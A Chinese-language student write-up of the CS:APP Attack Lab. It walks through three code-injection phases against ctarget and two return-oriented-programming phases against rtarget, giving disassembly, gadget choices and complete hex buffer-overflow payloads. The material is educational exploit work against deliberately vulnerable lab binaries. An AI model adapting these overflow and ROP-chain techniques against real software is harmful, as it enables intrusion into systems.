## attack lab

### 概要

说明文档:http://csapp.cs.cmu.edu/3e/attacklab.pdf

这个lab主要是简单的漏洞利用.比较偏pwn.

有两个文件ctarget和rtarget.

ctarget有三道题,方法是Code injection

rtarget有两道题,方法是Return-oriented programming

### ctarget

#### phase1

根据文档说明.

通过调用getbuf()

```
void test() {
      int val;
      val = getbuf();
      printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

返回跳转到touch1即可.

观察getbuf()的汇编

```
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	callq  401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	retq 
```

可以看到开了0x28的缓冲区,可以用40*A+0x004017c0来填充.

所以result1.txt如下:

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
c0 17 40 00 00 00 00 00
```

#### phase2

根据文档说明

```
void touch2(unsigned val)
  {
     vlevel = 2; /* Part of validation protocol */
     if (val == cookie) {
         printf("Touch2!: You called touch2(0x%.8x)\n", val);
         validate(2);
     } else {
         printf("Misfire: You called touch2(0x%.8x)\n", val);
         fail(2);
     }
     exit(0);
 }
```

要返回一个cookie给touch2.

我们知道第一个参数存储在%rdi中.

所以需要注入下列代码:

```
movq $0x59b997fa,%rdi
pushq $0x004017ec         
retq
```

然后再return到这个部分代码即可.

```
48 c7 c7 fa 97 b9 59
68 ec 17 40 00
c3 
41 41 41 
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
78 dc 61 55 00 00 00 00
```

#### phase3

根据文档说明

```
void touch3(char *sval)
 {
     if (hexmatch(cookie, sval)) {
         printf("Touch3!: You called touch3(\"%s\")\n", sval);
         validate(3);
     } else {
         printf("Misfire: You called touch3(\"%s\")\n", sval);
         fail(3);
     }
     exit(0);
 }
```

要把cookie转换成char* 传入touch3

char*指针是指的地址,所以也就是传个地址.

因为调用了hexmatch会使用到下面的栈帧,所以把字符串存在更早的栈空间里面.

这里用的是`%rsp+0x28+0x8`的位置.

所以构造注入代码:

```
movq $0x5561dca8,%rdi                                        
pushq $0x004018fa
retq
```

result3.txt:

```
48 c7 c7 a8 dc 61 55 
68 fa 18 40 00 
c3 
41 41 41 
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61 
```

### rtarget

#### phase1

实现touch2,不过这里开了一些保护(栈地址随机化).不能再用rsp来跳转了.

这里使用ROP的方式.

采用了两个gadget

第一个是

```bash
00000000004019ca <getval_280>:
  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
  4019cf:   c3                      retq
```

中的

```undefined
58 90 popq %rax
c3    retq
```

以及

```bash
00000000004019c3 <setval_426>:
  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:   c3                      retq  
```

中的

```undefined
48 89 c7 movq %rax,%rdi
90       nop
c3       retq
```

来构造一段注入代码:

```rust
(0x4019ca+0x2=0x4019cc)
popq %rax     
//这里popq一个长度为0x8的cookie.
retq 
(0x4019c3+0x2=0x4019c5)
movq %rax,%rdi            
nop
retq
```

result4:

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
cc 19 40 00 00 00 00 00 
fa 97 b9 59 00 00 00 00 
c5 19 40 00 00 00 00 00 
ec 17 40 00 00 00 00 00  
```

#### phase2

实现touch3.

使用了3个gadget.

第一个是

```
0000000000401aab <setval_350>:
  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
  401ab1:   c3                      retq
```

中的

```
48 89 e0  movq %rsp, %rax
c3        retq
```

第二个是用于增加地址的

```
00000000004019d6 <add_xy>:
  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
  4019da:   c3                      retq
```

中的

```
04 37 add $0x37, %al
c3    retq
```

第三个是

```
00000000004019a0 <addval_273>:
  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
  4019a6:   c3                      retq
```

中的

```
48 89 c7 mov %rax, %rdi
c3 	 	  retq
```

所以最后的result5是:

```
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
ad 1a 40 00 00 00 00 00
d8 19 40 00 00 00 00 00  
a2 19 40 00 00 00 00 00
fa 18 40 00 00 00 00 00
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 41
41 41 41 41 41 41 41 
35 39 62 39 39 37 66 61
```

